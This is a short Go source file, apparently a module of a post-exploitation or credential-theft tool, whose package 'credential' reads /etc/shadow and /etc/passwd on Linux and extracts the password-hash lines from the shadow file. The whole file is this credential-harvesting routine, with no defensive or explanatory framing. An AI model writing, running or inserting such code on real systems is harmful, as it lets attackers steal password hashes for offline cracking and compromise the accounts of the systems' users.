//go:build linux

package credential

import (
	"os"
	"strings"
)

func ReadShadow() string {
	data, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return ""
	}
	return string(data)
}

func ReadPasswd() string {
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return ""
	}
	return string(data)
}

func ExtractHashes() string {
	shadow := ReadShadow()
	lines := strings.Split(shadow, "\n")
	var hashes []string
	for _, line := range lines {
		if strings.Contains(line, ":") {
			hashes = append(hashes, line)
		}
	}
	return strings.Join(hashes, "\n")
}
